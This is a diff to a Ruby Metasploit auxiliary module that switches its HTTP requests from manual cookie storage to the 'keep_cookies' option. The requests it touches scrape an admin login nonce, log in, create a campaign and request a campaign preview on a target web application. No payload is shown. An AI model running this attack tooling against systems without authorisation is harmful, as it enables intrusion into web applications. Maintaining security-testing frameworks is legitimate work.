@@ -53,7 +53,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'api', 'about'),
-      'cookie' => @cookie
+      'keep_cookies' => true,
     })
 
     return Msf::Exploit::CheckCode::Unknown('Connection failed') unless res
@@ -82,7 +82,8 @@ class MetasploitModule < Msf::Auxiliary
   def get_nonce
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'admin', 'login')
+      'uri' => normalize_uri(target_uri.path, 'admin', 'login'),
+      'keep_cookies' => true
     })
 
       fail_with(Failure::Unreachable, 'Connection failed') unless res
@@ -93,8 +94,6 @@ class MetasploitModule < Msf::Auxiliary
   nonce = html.at('input[@name="nonce"]/@value')
   fail_with(Failure::UnexpectedReply, 'Could not extract nonce from login page') unless nonce
 
-  @cookie = res.get_cookies
-
   nonce.text
   end
 
@@ -104,7 +103,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(target_uri.path, 'admin', 'login'),
-      'cookie' => @cookie,
+      'keep_cookies' => true,
       'vars_post' => {
         'nonce' => nonce,
         'next' => '/admin',
@@ -117,7 +116,6 @@ class MetasploitModule < Msf::Auxiliary
    
 
     if res.code == 302
-      @cookie = res.get_cookies
       print_good('Login successful')
     else
       fail_with(Failure::NoAccess, "Login failed with code #{res.code}")
@@ -128,7 +126,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(target_uri.path, 'api', 'campaigns'),
-      'cookie' => @cookie,
+      'keep_cookies' => true,
       'ctype' => 'application/json',
       'data' => {
         'archiveSlug' => 'tmp',
@@ -168,7 +166,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(target_uri.path, 'api', 'campaigns', campaign_id.to_s, 'preview'),
-      'cookie' => @cookie,
+      'keep_cookies' => true,
       'vars_post' => {
         'template_id' => '1',
         'content_type' => 'richtext',
